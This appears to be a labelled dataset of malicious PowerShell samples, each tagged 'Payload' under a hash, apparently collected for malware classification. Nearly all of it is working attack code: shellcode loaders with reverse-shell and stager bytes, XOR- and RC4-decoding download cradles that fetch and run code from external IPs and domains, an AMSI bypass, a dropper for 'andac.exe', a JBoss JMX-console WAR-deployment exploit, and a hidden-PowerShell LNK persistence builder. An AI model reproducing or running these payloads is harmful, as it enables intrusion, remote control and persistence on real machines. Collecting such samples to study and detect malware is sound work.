$x=0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xbb,0x01,0x00,0x00,0xe8,0x8a,0x00,0x00,0x00,0x2f,0x46,0x4f,0x4a,0x46,0x37,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe0,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x08,0x4f,0x75,0xd9,0xe8,0x4b,0x00,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x77,0xff,0xff,0xff,0x33,0x38,0x2e,0x31,0x32,0x36,0x2e,0x31,0x36,0x39,0x2e,0x31,0x30,0x37,0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$C=$J::VirtualAlloc(0,[Math]::Max($x.Length,0x1000),0x3000,0x40);for($A=0;$A -le($x.Length-1);$A++){$J::memset([IntPtr]($C.ToInt32()+$A),$x[$A],1)|Out-Null};$J::CreateThread(0,0,$C,0,0,0);for(;;){Start-sleep 60};';$n=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($v));$a=$ENV:Processor_Architecture;if($a -ne'x86'){iex ""& $env:SystemRoot\\syswow64\\windowspowershell\\v1.0\\powershell.exe -enc $n""}else{iex $v};

",Payload
2151c11e8601e860aeff220fe9a51cf802a6879f9f0fa34503a8f28fa9ce05f1,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xce,0xd9,0x74,0x24,0xf4,0xba,0xbc,0x46,0x81,0x48,0x5d,0x29,0xc9,0xb1,0x47,0x31,0x55,0x18,0x83,0xed,0xfc,0x03,0x55,0xa8,0xa4,0x74,0xb4,0x38,0xaa,0x77,0x45,0xb8,0xcb,0xfe,0xa0,0x89,0xcb,0x65,0xa0,0xb9,0xfb,0xee,0xe4,0x35,0x77,0xa2,0x1c,0xce,0xf5,0x6b,0x12,0x67,0xb3,0x4d,0x1d,0x78,0xe8,0xae,0x3c,0xfa,0xf3,0xe2,0x9e,0xc3,0x3b,0xf7,0xdf,0x04,0x21,0xfa,0xb2,0xdd,0x2d,0xa9,0x22,0x6a,0x7b,0x72,0xc8,0x20,0x6d,0xf2,0x2d,0xf0,0x8c,0xd3,0xe3,0x8b,0xd6,0xf3,0x02,0x58,0x63,0xba,0x1c,0xbd,0x4e,0x74,0x96,0x75,0x24,0x87,0x7e,0x44,0xc5,0x24,0xbf,0x69,0x34,0x34,0x87,0x4d,0xa7,0x43,0xf1,0xae,0x5a,0x54,0xc6,0xcd,0x80,0xd1,0xdd,0x75,0x42,0x41,0x3a,0x84,0x87,0x14,0xc9,0x8a,0x6c,0x52,0x95,0x8e,0x73,0xb7,0xad,0xaa,0xf8,0x36,0x62,0x3b,0xba,0x1c,0xa6,0x60,0x18,0x3c,0xff,0xcc,0xcf,0x41,0x1f,0xaf,0xb0,0xe7,0x6b,0x5d,0xa4,0x95,0x31,0x09,0x09,0x94,0xc9,0xc9,0x05,0xaf,0xba,0xfb,0x8a,0x1b,0x55,0xb7,0x43,0x82,0xa2,0xb8,0x79,0x72,0x3c,0x47,0x82,0x83,0x14,0x83,0xd6,0xd3,0x0e,0x22,0x57,0xb8,0xce,0xcb,0x82,0x55,0xca,0x5b,0x76,0x11,0xa4,0x98,0xe0,0x67,0x45,0x8f,0xac,0xee,0xa3,0xff,0x1c,0xa1,0x7b,0xbf,0xcc,0x01,0x2c,0x57,0x07,0x8e,0x13,0x47,0x28,0x44,0x3c,0xed,0xc7,0x31,0x14,0x99,0x7e,0x18,0xee,0x38,0x7e,0xb6,0x8a,0x7a,0xf4,0x35,0x6a,0x34,0xfd,0x30,0x78,0xa0,0x0d,0x0f,0x22,0x66,0x11,0xa5,0x49,0x86,0x87,0x42,0xd8,0xd1,0x3f,0x49,0x3d,0x15,0xe0,0xb2,0x68,0x2e,0x29,0x27,0xd3,0x58,0x56,0xa7,0xd3,0x98,0x00,0xad,0xd3,0xf0,0xf4,0x95,0x87,0xe5,0xfa,0x03,0xb4,0xb6,0x6e,0xac,0xed,0x6b,0x38,0xc4,0x13,0x52,0x0e,0x4b,0xeb,0xb1,0x8e,0xb7,0x3a,0xff,0xe4,0xd9,0xfe;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
8eda386f955d3e916fbc94d0033bdf6685ca5d6d7d7e95942ec4b985781a2f6a,"
($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://201.130.72.171/andac.exe', $dpl);Start-Process $dpl

",Payload
b2464be46cf7edd49662294e31cb37306105673f7bffc3d249ab67a3992fd0fa,"
[ReF].AsSemBly.GetTyPe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GetFiELd('amsiInitFailed','NonPublic,Static').SeTVaLuE($NUlL,$True)};[SYsTEM.NEt.SeRVicEPoIntManAger]::ExpECt100COnTiNuE=0;$wc=NeW-OBJect SysTEm.Net.WEBClIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEAdErS.ADD('User-Agent',$u);$Wc.Proxy=[SYsTEM.NeT.WEBReQuEsT]::DEFAUlTWebPRoXY;$Wc.ProXY.CREDENtiALs = [SYstem.NeT.CredeNtiALCACHe]::DEFaUlTNEtWOrkCRedEnTIAls;$K=[SYsTeM.TExt.ENcodiNG]::ASCII.GEtBYtes('092f88229804a93705f8c2a11ac65d9f');$R={$D,$K=$ARGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COunT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxoR$S[($S[$I]+$S[$H])%256]}};$wc.HeADeRS.ADD(""Cookie"",""session=49d1auYSdQL5+WVk8jT7PYLXFSw="");$ser='http://amazonsdeliveries.com:80';$t='/account/login.php';$DAta=$WC.DOWnlOADDATa($SeR+$T);$iv=$dATA[0..3];$dAtA=$Data[4..$DAtA.LEngth];-jOIn[ChAr[]](& $R $DAtA ($IV+$K))|IEX

",Payload
40084183de83c338498315227979e22fd94c8a860646412154f203d7b4703095,"
[SYsTem.NEt.SErvIcEPoIntManagEr]::ExpECT100COnTinue = 0;$Wc=New-OBJeCT SYSteM.Net.WeBCLieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEADErs.Add('User-Agent',$u);$wC.PRoXy = [SYstEm.NEt.WebREquesT]::DEFAUlTWeBPrOXy;$wC.PRoxY.CREdEnTIAls = [SySTEM.Net.CrEdeNtIALCAChe]::DeFauLtNETwORkCredENtiALs;$K='2b21d9d8f81c6e564c84ef0bfa94aa5c';$i=0;[cHaR[]]$B=([cHaR[]]($wc.DOWNlOadStrINg(""http://172.16.0.147:8080/index.asp"")))|%{$_-bXOR$K[$i++%$k.LEngTH]};IEX ($B-join'')

",Payload
2214c025d39aab62fa3cee32b083cc3758f66ae1951e163e60afb21893a1687c,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x05,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
64fed502728e7f73aad8b5215ee3bf1ce9819d75a67aced7138bea29895c0d84,"
$BvV8 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $BvV8 -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd4,0xb8,0xc2,0x03,0x41,0xcf,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x47,0x31,0x45,0x18,0x83,0xed,0xfc,0x03,0x45,0xd6,0xe1,0xb4,0x33,0x3e,0x67,0x36,0xcc,0xbe,0x08,0xbe,0x29,0x8f,0x08,0xa4,0x3a,0xbf,0xb8,0xae,0x6f,0x33,0x32,0xe2,0x9b,0xc0,0x36,0x2b,0xab,0x61,0xfc,0x0d,0x82,0x72,0xad,0x6e,0x85,0xf0,0xac,0xa2,0x65,0xc9,0x7e,0xb7,0x64,0x0e,0x62,0x3a,0x34,0xc7,0xe8,0xe9,0xa9,0x6c,0xa4,0x31,0x41,0x3e,0x28,0x32,0xb6,0xf6,0x4b,0x13,0x69,0x8d,0x15,0xb3,0x8b,0x42,0x2e,0xfa,0x93,0x87,0x0b,0xb4,0x28,0x73,0xe7,0x47,0xf9,0x4a,0x08,0xeb,0xc4,0x63,0xfb,0xf5,0x01,0x43,0xe4,0x83,0x7b,0xb0,0x99,0x93,0xbf,0xcb,0x45,0x11,0x24,0x6b,0x0d,0x81,0x80,0x8a,0xc2,0x54,0x42,0x80,0xaf,0x13,0x0c,0x84,0x2e,0xf7,0x26,0xb0,0xbb,0xf6,0xe8,0x31,0xff,0xdc,0x2c,0x1a,0x5b,0x7c,0x74,0xc6,0x0a,0x81,0x66,0xa9,0xf3,0x27,0xec,0x47,0xe7,0x55,0xaf,0x0f,0xc4,0x57,0x50,0xcf,0x42,0xef,0x23,0xfd,0xcd,0x5b,0xac,0x4d,0x85,0x45,0x2b,0xb2,0xbc,0x32,0xa3,0x4d,0x3f,0x43,0xed,0x89,0x6b,0x13,0x85,0x38,0x14,0xf8,0x55,0xc5,0xc1,0x95,0x50,0x51,0x2a,0xc1,0x70,0xff,0xc2,0x10,0x87,0xfe,0xa9,0x9c,0x61,0x50,0x9e,0xce,0x3d,0x10,0x4e,0xaf,0xed,0xf8,0x84,0x20,0xd1,0x18,0xa7,0xea,0x7a,0xb2,0x48,0x43,0xd2,0x2a,0xf0,0xce,0xa8,0xcb,0xfd,0xc4,0xd4,0xcb,0x76,0xeb,0x29,0x85,0x7e,0x86,0x39,0x71,0x8f,0xdd,0x60,0xd7,0x90,0xcb,0x0f,0xd7,0x04,0xf0,0x99,0x80,0xb0,0xfa,0xfc,0xe6,0x1e,0x04,0x2b,0x7d,0x96,0x90,0x94,0xe9,0xd7,0x74,0x15,0xe9,0x81,0x1e,0x15,0x81,0x75,0x7b,0x46,0xb4,0x79,0x56,0xfa,0x65,0xec,0x59,0xab,0xda,0xa7,0x31,0x51,0x05,0x8f,0x9d,0xaa,0x60,0x11,0xe1,0x7c,0x4c,0x67,0x0b,0xbd;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$G6oE=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($G6oE.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$G6oE,0,0,0);for (;;){Start-sleep 60};

",Payload
4bc1a099f2afa64f03a8b99849e4c1d1ef71d8583511c9b52eeff2ace1d47a9e,"
[SYsteM.NET.ServicePOINtMAnaGEr]::ExPEct100CoNtInue = 0;$WC=New-ObJEct SySTem.NeT.WEBCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HEADERS.ADd('User-Agent',$u);$Wc.PrOXy = [SySTEm.NeT.WeBReQueSt]::DEfaULtWEbProxY;$wC.ProXy.CREdENTIALs = [SYsTEm.Net.CREdentiaLCache]::DEfauLtNEtwoRkCREdEntiAlS;$K='63a9f0ea7bb98050796b649e85481845';$i=0;[cHAR[]]$b=([CHaR[]]($wc.DownLoAdStRING(""http://138.121.170.12:3137/index.asp"")))|%{$_-BXOr$K[$i++%$k.Length]};IEX ($B-JoIN'')

",Payload
686e7addb006e7fff39c7bb13c61511a25c537e6f3e66ed7f53f96c3933933c7,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x01,0x0a,0x59,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
ffced7576aa2c897044ab93b8c4b107ac22680d93ec71cc2582a7c932463d615,"
[SYstEm.NEt.SERvicePOInTMAnaGeR]::ExpECt100CONtINuE = 0;$Wc=NEW-ObJeCt SyStEM.Net.WEBCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeaDErS.Add('User-Agent',$u);$wC.Proxy = [SYSteM.NET.WEbReqUEsT]::DefAulTWeBProxy;$wC.Proxy.CREDEntIAls = [SYsTEm.Net.CreDentiALCaCHe]::DefAulTNETWOrkCrEdEnTIALs;$K='(roQT)JgF3S

",Payload
6720e41d88ed2f892215d88b38aa9a971695bc7a97dfcc2ed9a46762cb7b7fb1,"
iex (new-object net.webclient).downloadstring('https://invesco.online/aaa')

",Payload
93b17491e1fb970909a46a0bbcbb6b6af6e1f3ca9552369a69f2b6a40fe52042,"function Exploit-JMXConsole
{
    
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$True)]
        [String]
        $Rhost,
        
        [Parameter(Mandatory=$True)]
        [Int]
        $Port,
        
        [String]
        $SSL,
        
        [Parameter(Mandatory=$True)]
        [String]
        $AppName,
        
        [Parameter(Mandatory=$True)]
        [String]
        $WARFile
    )

    try
    {
        $URL = ""http$($SSL)://"" + $($Rhost) + ':' + $($Port) + ""/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=19&arg0="" + $($WARFile)
        $URI = New-Object -TypeName System.Uri -ArgumentList $URL
        $WebRequest = [System.Net.WebRequest]::Create($URI)
        $WebRequest.Method = ""HEAD""
        $Response = $WebRequest.GetResponse()
        $Response.Close()
    }
    catch
    {
        $ErrorMessage = $_.Exception.ErrorMessag
        Write-Output ""[*] Error, transfer failed""
        break
        
    }


    Start-Sleep -s 20
    
    

    try
    {
        $URL = ""http$($SSL)://"" + $($Rhost) + ':' + $($Port) + '/' + $($AppName) + '/' + $($AppName) + '.jsp?'
        Write-Output ""[*] Invoking your file at "" + $URL
        $URI = New-Object -TypeName System.Uri -ArgumentList $URL
        $WebRequest = [System.Net.WebRequest]::Create($URI)
        $WebRequest.Method = ""GET""
        $Response = $WebRequest.GetResponse()
        $Response.Close()
        Write-Output ""[*] You're file has been deployed.""    
    }
    catch
    {
        $ErrorMessage = $_.Exception.ErrorMessag
        Write-Output ""[*] Error, transfer failed""
        break
        
    }
}

function Exploit-JBoss
{
    
    
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$True)]
        [String]
        $Rhost,
        
        [Parameter(Mandatory=$True)]
        [Int]
        $Port,
        
        [Switch]
        $UseSSL,
        
        [Parameter(Mandatory=$True)]
        [Switch]
        $JMXConsole,
        
        [Parameter(Mandatory=$True)]
        [String]
        $AppName,
        
        [Parameter(Mandatory=$True)]
        [String]
        $WARFile
    )

    begin
    {
        if ($UseSSL)
        {
           
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
            $SSL = 's'
        } else {
            $SSL = ''
        }
        
    }
    
    process
    {
       if ($JMXConsole)
        {
            Exploit-JMXConsole -Rhost $Rhost -SSL $SSL -Port $Port -AppName $AppName -WARFile $WARFile
        } 
    }
    
    end
    {
        Write-Output ""Complete. Your payload has been delivered""
    }
    
}",Payload
f19154f714f23d657552fe7e806b4a3c96e51ccf688d7ec9eda37602ff7b0d4f,"function Find-TrustedDocuments
{

    $BASE_EXCEL_REG_LOCATIONS = ""HKCU:\\Software\\Microsoft\\Office\\11.0\\Excel\\Security"", ""HKCU:\\Software\\Microsoft\\Office\\12.0\\Excel\\Security"", ""HKCU:\\Software\\Microsoft\\Office\\14.0\\Excel\\Security"", ""HKCU:\\Software\\Microsoft\\Office\\15.0\\Excel\\Security"" 

    $verified_excel_base_reg_locations = @()
    $trusted_excel_documents = @()

    
    foreach ($location in $BASE_EXCEL_REG_LOCATIONS){
        $valid_path = Test-Path $location
        if ($valid_path -eq $True){
            $verified_excel_base_reg_locations += $location
        }
    }
    if ($verified_excel_base_reg_locations.length -eq 0){
        Write-Output ""[*] No trusted document locations found""
    }
    else {
        Write-Output ""[+] Trusted Document Locations for Excel""
        
        foreach ($base_excel_reg_location in $verified_excel_base_reg_locations){
            $trusted_location_root = $base_excel_reg_location + ""\\Trusted Locations""
            $all_trusted_locations = (Get-ChildItem $trusted_location_root) | Select Name
            foreach ($loc in $all_trusted_locations){
                $complete_reg_path = $trusted_location_root + ""\\"" + ($loc.Name | Split-Path -leaf)
                $location_props = Get-ItemProperty $complete_reg_path
                $path = $location_props.Path
                Write-Output $path
            }
        }
    }
    
    foreach ($valid_location in $verified_excel_base_reg_locations){
        $valid_location = $valid_location + ""\\Trusted Documents""
        if ((Test-Path $valid_location) -eq $True){
            $trusted_document_property = Get-ChildItem $valid_location | select Property
            $trusted_document = [System.Environment]::ExpandEnvironmentVariables($trusted_document_property.property)
            $trusted_excel_documents += $trusted_document
        }
    }
    if ($trusted_excel_documents.length -eq 0){
        Write-Output ""`n[*] No trusted documents found""
    }
    else{
        Write-Output ""`n[+] Trusted documents:""
        foreach ($doc in $trusted_excel_documents){
            Write-Output $doc""`n""
    }
    }
    Write-Output ""`n""
}",Payload
3a5818d3a6cdad4420cedf5436cfdd44ae7ef77453d3eecaee5159fbc20d08fb,"
$Wc=NEw-OBjeCt SystEM.NeT.WEBClIEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEaDERs.AdD('User-Agent',$u);$wC.PRoXY = [SystEM.NeT.WEBRequeST]::DEfAuLTWEbPROxy;$wc.PrOxy.CrEdEnTIaLs = [SYsteM.NET.CrEDentIALCAcHe]::DEFaUltNeTWORkCrEDentIaLS;$K='6193bd249e1376a0b80aac6969be6dee';$i=0;[CHaR[]]$b=([CHaR[]]($Wc.DOwNloaDSTRiNg(""http://11.79.40.53:80/index.asp"")))|%{$_-bXor$k[$i++%$k.LEnGtH]};IEX ($B-Join'')

",Payload
74db94b80c2c87da49d7825b4e9fdec35c61d5b3b996d6121dfc220fd9ce2c6a,"function Create-HotKeyLNK {

    [CmdletBinding(DefaultParameterSetName = 'None')]
    param(

    [Parameter(Mandatory=$True)]
        [String]
        $LNKName,

        [Parameter(Mandatory=$True)]
        [String]
        $PersistencePath = ""TaskBar"",

        [Parameter()]
        [String]
        $EXEPath = ""$env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",

        [Parameter()]
        $IconPath = ""$env:programfiles\\Internet Explorer\\iexplore.exe"",

        [Parameter()]
        [String]
        $HotKey = ""CTRL+C"",

        [Parameter(Mandatory=$True)]
        [String]
        $PayloadURI

    )

     
    $LNKName = ""C:\\Users\\rvrsh3ll\\Desktop\\"" + $LNKName + "".lnk""
    if ($PersistencePath -eq 'TaskBar') {
        $PersistencePath = ""$env:APPDATA\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar""
    } elseif ($PersistencePath -eq 'ImplicitAppShortcuts'){
        $PersistencePath = ""$env:APPDATA\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\ImplicitAppShortcuts""
    } elseif ($PersistencePath -eq 'Start Menu') {
        $PersistencePath = ""$env:APPDATA\\Microsoft\\Windows\\Start Menu""
    } elseif ($PersistencePath -eq 'Desktop') {
        $PersistencePath = ""$env:userprofile\\Desktop""
    }

    $payload = ""`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('$PayloadURI'))""
    $encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
    $finalPayload = ""-nop -WindowStyle Hidden -enc $encodedPayload""
    $obj = New-Object -ComObject WScript.Shell
